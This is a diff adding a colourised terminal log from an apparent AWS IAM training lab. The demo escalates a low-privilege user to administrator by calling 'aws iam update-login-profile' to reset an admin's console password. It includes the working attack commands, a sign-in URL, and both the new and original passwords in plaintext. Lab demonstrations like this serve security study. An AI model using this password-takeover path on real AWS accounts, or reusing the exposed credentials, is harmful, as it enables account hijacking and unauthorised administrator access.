@@ -1,0 +1,82 @@
+[0;32m========================================[0m
+[0;32mIAM UpdateLoginProfile Privilege Escalation Demo[0m
+[0;32m========================================[0m
+[1;33mUser-Based One-Hop to Admin[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-iam-006-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-iam-006-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-iam-006-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying admin user has existing login profile[0m
+Admin user: pl-prod-iam-006-to-admin-target-user
+Checking for existing console login profile...
+[2m[ReadOnly] $ aws iam get-login-profile --user-name pl-prod-iam-006-to-admin-target-user[0m
+[0;32m✓ Confirmed: Admin user has existing login profile[0m
+
+[1;33mStep 5: Checking admin user's permissions[0m
+Listing policies attached to admin user...
+[2m[ReadOnly] $ aws iam list-attached-user-policies --user-name pl-prod-iam-006-to-admin-target-user --query 'AttachedPolicies[*].PolicyName' --output text[0m
+Attached policies: AdministratorAccess
+[0;32m✓ Confirmed: Admin user has AdministratorAccess policy[0m
+
+[1;33mStep 6: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 7: Updating login profile via iam:UpdateLoginProfile[0m
+Changing console password for admin user: pl-prod-iam-006-to-admin-target-user
+New password: PathfindingLabs456!dfc96274
+
+[0;36m[Attacker] $ aws iam update-login-profile --user-name pl-prod-iam-006-to-admin-target-user --password "PathfindingLabs456!dfc96274" --no-password-reset-required[0m
+[0;32m✓ Successfully updated login profile for admin user![0m
+
+[1;33mWaiting 15 seconds for IAM changes to propagate...[0m
+
+[1;33mStep 8: Password has been successfully changed[0m
+The admin user can now log in with the new password.
+[0;32m✓ Confirmed password update![0m
+
+[0;32m========================================[0m
+[0;32mAttack Summary[0m
+[0;32m========================================[0m
+Starting Point: User [1;33mpl-prod-iam-006-to-admin-starting-user[0m
+Step 1: Used [1;33miam:UpdateLoginProfile[0m to change console password for pl-prod-iam-006-to-admin-target-user
+Step 2: Gained [1;33mAdministrator Access[0m (console login)
+Result: [0;32mAdministrator Access[0m
+
+[1;33mAttack Path:[0m
+  pl-prod-iam-006-to-admin-starting-user → (UpdateLoginProfile) → pl-prod-iam-006-to-admin-target-user → Admin
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws iam update-login-profile --user-name pl-prod-iam-006-to-admin-target-user --password "PathfindingLabs456!dfc96274" --no-password-reset-required[0m
+
+[0;32mConsole Login Information:[0m
+  URL: [1;33mhttps://697683661464.signin.aws.amazon.com/console[0m
+  Username: [1;33mpl-prod-iam-006-to-admin-target-user[0m
+  New Password: [1;33mPathfindingLabs456!dfc96274[0m
+  Original Password: [1;33mqBa(9l9kG-&Zywa+Vig3[0m (saved for cleanup)
+
+[0;31mIMPORTANT: Run cleanup_attack.sh to restore the original password[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-iam-006-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
